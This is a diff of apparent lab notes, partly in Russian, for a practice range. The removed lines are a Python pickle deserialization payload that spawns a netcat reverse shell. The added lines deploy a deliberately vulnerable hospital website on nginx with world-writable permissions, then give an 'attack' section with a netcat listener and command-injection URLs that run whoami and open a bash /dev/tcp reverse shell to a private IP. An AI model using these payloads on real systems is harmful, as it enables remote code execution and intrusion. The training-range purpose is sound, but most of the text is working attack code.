@@ -1,10 +1,36 @@
-import pickle
-import base64
-
-class RCE:
-    def __reduce__(self):
-        import subprocess
-        return (subprocess.call, (['/bin/sh', '-c', 'nc -e /bin/sh 10.10.105.53 4444'],))
-
-payload = base64.b64encode(pickle.dumps(RCE())).decode()
-print(payload)
+https://github.com/b4n4n0ff/hsopitalsiteforpolygon
+ sudo apt update
+ sudo apt install -y nginx
+ cd /var/www
+ git clone 
+https://github.com/b4n4n0ff/hospitalsiteforpolygon.git
+ sudo chown -R $(whoami):$(whoami) /var/www/hospitalsiteforpolygon
+ sudo chmod -R 777 /var/www/hospitalsiteforpolygon
+ sudo tee /etc/nginx/sites-available/hospitalsite.conf > /dev/null
+ <<'EOF'
+ server {
+ listen 90 default_server;
+ listen [::]:90 default_server;
+ root /var/www/hospitalsiteforpolygon;
+ index index.html index.htm index.php;
+ server_name 192.168.10.4; # можно заменить на домен или IP
+ location ~ \.php$ {
+ include snippets/fastcgi-php.conf;
+ fastcgi_pass unix:/run/php/php7.4-fpm.sock;
+ }
+ }
+ EOF
+ # для логов
+ access_log /var/log/nginx/hospitalsite.access.log;
+ error_log  /var/log/nginx/hospitalsite.error.log;
+ sudo ln -s /etc/nginx/sites-available/hospitalsite.conf /etc/nginx/sites-enabled/
+sudo mv /var/www/hsopitalsiteforpolygon /var/www/hospitalsiteforpolygon
+ sudo apt install -y php-fpm
+ sudo nginx -t
+ sudo systemctl reload nginx
+ атака
+ nc -lvnp 4444
+ curl "http://192.168.10.4:90/patient_search.php?
+ debug=true&search_query=test;whoami"
+ http://192.168.10.4:90/patient_search.php?debug=true&search_query=test;bash+
+c+'bash+-i+>%26+/dev/tcp/192.168.10.250/4444+0>%261'
